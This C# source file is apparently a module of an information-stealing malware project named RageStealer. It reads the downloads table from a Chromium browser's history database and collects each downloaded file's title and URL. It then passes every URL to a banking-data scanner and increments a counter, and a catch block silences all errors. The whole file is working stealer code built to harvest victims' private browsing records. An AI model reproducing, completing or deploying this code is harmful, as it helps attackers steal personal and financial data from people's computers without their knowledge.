using System.Collections.Generic;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Browsers.Chromium;

internal sealed class Downloads
{
	public static List<Site> Get(string sHistory)
	{
		List<Site> list = new List<Site>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sHistory, "downloads");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Site site = default(Site);
				site.Title = Crypto.GetUtf8(sqLite.GetValue(i, 2));
				site.Url = Crypto.GetUtf8(sqLite.GetValue(i, 17));
				Site item = site;
				list.Add(item);
				Banking.ScanData(item.Url);
				Counter.Downloads++;
			}
		}
		catch
		{
		}
		return list;
	}
}
